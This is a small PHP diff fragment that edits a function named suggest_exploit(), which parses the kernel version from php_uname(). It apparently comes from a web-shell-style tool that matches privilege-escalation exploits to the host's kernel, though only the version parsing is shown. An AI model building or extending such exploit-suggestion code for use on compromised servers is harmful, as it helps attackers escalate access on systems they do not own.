@@ -90,7 +90,7 @@ function swd($s_p){
 }
 function suggest_exploit()
 {
-    $uname = php_uname();
+    $uname = php_uname('a');
     $xplod = explode(" ", $uname);
     $xpld = explode("-", $xplod[2]);
     $pl = explode(".", $xpld[0]);
